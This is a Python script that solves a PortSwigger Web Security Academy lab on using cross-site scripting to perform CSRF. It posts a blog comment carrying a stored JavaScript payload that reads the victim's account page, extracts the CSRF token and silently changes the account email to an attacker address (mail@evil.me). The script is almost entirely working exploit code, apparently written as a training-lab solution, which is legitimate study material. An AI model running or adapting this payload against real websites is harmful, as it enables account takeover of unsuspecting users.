#!/usr/bin/env python3
# Exploiting XSS to perform CSRF
# Lab-Link: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(client, url):
    try:
        r = client.get(url)
        soup = BeautifulSoup(r.text, 'html.parser')
        return soup.find('input', attrs={'name': 'csrf'})['value']
    except: 
        return None


def post_comment(client, host, idx):
    url = f'{host}/post/comment'
    data = {
        'csrf': get_csrf_token(client, f'{host}/post?postId={idx}'),
        'postId': idx,
        'comment': '''<script>
var r = new XMLHttpRequest();
r.onload=function() {
    csrf = this.responseText.match(/csrf" value="(\w+)"/)[1];
    var attack = new XMLHttpRequest();
    attack.open("POST", "''' + host + '''/my-account/change-email", "true");
    attack.send("email=mail@evil.me&csrf=" + csrf);
}
r.open("GET", "''' + host + '''/my-account", "true");
r.withCredential = true;
r.send();
</script>''',
        'name': 'MyName',
        'email': 'invalid@example.com',
        'website': 'http://www.example.com'
    }

    r = client.post(url, data=data)
    if 'Thank you for your comment!' not in r.text:
        return False
    return True


def main():
    print('[+] Exploiting XSS to perform CSRF')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    with requests.Session() as client:
        client.verify = False
        client.proxies = proxies

        if not post_comment(client, host, 6):
            print(f'[-] Failed to post the comment')
            sys.exit(-2)
        print(f'[+] Comment posted')

        # I had some times issues getting the proper result, so wait briefly before checking
        time.sleep(2)
        if 'Congratulations, you solved the lab!' not in client.get(f'{host}').text:
            print(f'[-] Failed to solve lab')
            sys.exit(-9)

        print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
